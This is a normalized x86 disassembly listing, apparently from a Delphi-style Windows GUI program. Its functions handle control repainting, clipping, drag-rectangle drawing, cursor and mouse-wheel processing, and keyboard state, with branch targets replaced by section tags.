pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d8cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443f64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43ce24
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443c60
push eax
call InvalidateRect
push ebp
call sub_43d840
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43d968
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_454618
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43e62c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403320
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d9c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443f64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443c60
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43da99
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_441a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443c60
push eax
call ReleaseDC
retn
sub_43db20
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax edi
call sub_43e660
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43cfc8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40695c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43e62c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43b7d4
sub_43dbf4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43dc30
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43dc7c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43dca8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43d428
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43d414
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402938
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402938
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_443c60
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43dd8c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43ddd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403320
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403320
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43de9c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43dee8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43df34
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43e04f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41e680
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e056
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43e088
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43cfc8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403320
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403320
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403320
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403320
jmp r-xdata
sub_43e178
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412cac
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43e660
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43d414
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43d428
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412cfc
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43e358
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43cf9c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403320
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_443c60
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ab98
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43e343
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_443c60
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_443c60
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43ce24
test esi esi
je r-xdata
sub_43e358
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403320
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43f1dc
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403320
mov eax esi
call sub_43cecc
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43ce88
mov ecx eax
xor edx edx
xor eax eax
call sub_412cd4
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403320
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43e3fc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43e42c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43e498
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43e558
sub_43e4c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43e4f8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43cfc8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43e524
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43e558
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43e62c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43e660
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43e6f8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_454618
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_454618
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43d024
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45ddc4
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403320
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45455c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403320
jmp r-xdata
sub_43e88c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_40886c
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408898
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43d024
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4086b0
call sub_408620
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408620
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43e934
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43e964
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
